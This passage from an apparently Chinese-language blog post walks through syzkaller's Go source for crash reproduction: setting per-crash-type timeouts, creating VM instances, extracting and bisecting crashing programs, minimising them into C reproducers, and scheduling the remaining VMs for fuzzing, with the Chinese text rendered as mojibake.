¹æ® crash ç±»å‹çš„ä¸åŒè®¾ç½®ä¸åŒçš„å¤ç°æ—¶é—´ä¸Šé™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// ä»¥æ•è·æ›´ç®€å•çš„ crashes (å³ no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// ä»¥æ•è· &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection å¯ä»¥è¢«æ›´å¿«åœ°æ£€æµ‹åˆ°,</span><br><span class="hljs-comment">// ä½†ç†è®ºä¸Šè‹¥å…¶ç”±ç«äº‰é€ æˆï¼Œåˆ™å¯èƒ½éœ€è¦æœ€é•¿çš„ timeout.</span><br><span class="hljs-comment">// No output ä»…èƒ½åœ¨æœ€å¤§çš„ timeout ä¸‹è¢«å¤ç°.</span><br><span class="hljs-comment">// ä½œä¸ºå¦¥åï¼Œæˆ‘ä»¬ä½¿ç”¨æœ€å°ä¸æœ€å¤§çš„ timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// ç”±äºæ˜‚è´µçš„è®¾ç½®ä¸æ‰«æï¼Œå†…å­˜æ³„éœ²ä¸èƒ½è¢«å¾ˆå¿«åœ°æ£€æµ‹åˆ°.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šå°†å´©æºƒä¿¡æ¯å­˜å‚¨åˆ°ä¸€ä¸ª <code>context</code> ç»“æ„ä½“ä¸­ï¼Œå¹¶æ–°å»ºä¸€ä¸ª WaitGroupï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>éšåå¾ªç¯è·å–ç”¨ä»¥å¤ç°çš„ VM idx å¹¶ä¾æ¬¡å¯åŠ¨æ–°åç¨‹è°ƒç”¨ <code>CreateExecProgInstance()</code> <strong>åˆ›å»º VM å¹¶æ‹·è´ crash ç¨‹åº</strong>ï¼Œè‹¥å¤±è´¥åˆ™ä¼‘çœ  10s åé‡è¯•ï¼Œæœ€å¤šä¼šå°è¯• <code>maxTry</code> æ¬¡ï¼›æˆåŠŸçš„ç»“æœä¼šè¾“å‡ºåˆ° <code>ctx.instances</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// ä¸€äº›æ”¶å°¾å·¥ä½œ...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> ä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vmPool.Create()</code> å¯åŠ¨è™šæ‹Ÿæœºåè°ƒç”¨ <code>SetupExecProg()</code> æ‹·è´è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ° <code>Run()</code>  ä¸­ï¼Œå…¶æœ€åä¼šè°ƒç”¨ <code>context.repro()</code> <strong>æ­£å¼å¼€å§‹å¤ç° crash çš„å·¥ä½œ</strong>ï¼Œæ£€æŸ¥ç»“æœåè¿”å›ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> å‡½æ•°ä¸»è¦åˆ†ä¸¤éƒ¨åˆ†ï¼š</p><ul><li><p>è°ƒç”¨ <code>extractProg()</code> <strong>è·å–è§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// å»é™¤åœ¨ crash å‘ç”Ÿåæ‰§è¡Œçš„ç¨‹åº.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>æœ€å°åŒ–ç¨‹åºé›†åˆå¹¶å°è¯•ç”Ÿæˆå¯ä»¥è§¦å‘è¯¥ crash çš„ C ç¨‹åºï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// å°è¯•æœ€å°åŒ–ç¨‹åºé›†</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// é¦–å…ˆå°è¯•åœ¨ä¸ç®€åŒ–é…ç½®çš„æƒ…å†µä¸‹æå– C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ–é…ç½®å¹¶å°è¯•æå– C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ– C ç›¸å…³çš„é…ç½®.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>é€†åºåè°ƒç”¨ <code>context.extractProgSingle()</code> <strong>é€ä¸ªè¿è¡Œå•ä¸ªç¨‹åº</strong>ï¼Œè‹¥æŸä¸€ç¨‹åºè§¦å‘äº† crash åˆ™ç›´æ¥è¿”å›</li><li>è‹¥å•ä¸€ç¨‹åºæ— æ³•è§¦å‘ crashï¼Œåˆ™è°ƒç”¨ <code>context.extractProgBisect()</code> <strong>ä½¿ç”¨äºŒåˆ†æ³•æ‰¾å‡ºè§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// åˆ†åˆ«æ‰§è¡Œæ¯ä¸ªç¨‹åºä»¥æ£€æµ‹ç”±å•ä¸ªç¨‹åºé€ æˆçš„ç®€å•çš„ crash.</span><br><span class="hljs-comment">// ç¨‹åºè¢«é€†åºæ‰§è¡Œ, é€šå¸¸æœ€åä¸€ä¸ªç¨‹åºå°±æ˜¯ç½ªé­ç¥¸é¦–.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// è‹¥åªæœ‰ä¸€ä¸ª entry åˆ™ä¸è¿›è¡ŒäºŒåˆ†.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// æ‰§è¡Œå¤šä¸ªç¨‹åºå¹¶äºŒåˆ† log ä»¥æ‰¾åˆ°é€ æˆå´©æºƒçš„å¤šä¸ªç¨‹åº.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯é€šè¿‡å¦‚ä¸‹è°ƒç”¨é“¾æ¥åœ¨ VM ä¸­æ‰§è¡Œç¨‹åºï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="â‘¡-å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ-fuzzing"><a href="#â‘¡-å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ-fuzzing" class="headerlink" title="â‘¡ å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ fuzzing"></a>â‘¡ å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ fuzzing</h4><p>æ­¤æ—¶å·²ç»ä¸æ»¡è¶³å¯ä»¥è¿›è¡Œ crash å¤ç°çš„æ¡ä»¶äº†ï¼Œå› è€Œä¼šæœ‰ç¬¬äºŒä¸ªå°å¾ªç¯å¯åŠ¨æ–°åç¨‹<strong>å°†èµ„æºæ± ä¸­å‰©ä½™ VM è°ƒåº¦å» fuzzing</strong>ï¼Œ å¹¶å°†ç»“æœè¾“å‡ºåˆ° <code>runDone</code> ä¸­ï¼š </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> å‡½æ•°å®é™…ä¸Šä¼šè°ƒç”¨ <code>runInstanceInner()</code>ï¼Œè¯¥å‡½æ•°<strong>ä»…å½“äº§ç”Ÿäº† Crash æ—¶è¿”å›çš„ç»“æœæ‰ä¸ä¸º nilï¼Œå³ runRepro é˜Ÿåˆ—å®é™…ä¸Šä¸º Crash é˜Ÿåˆ—ï¼š</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> 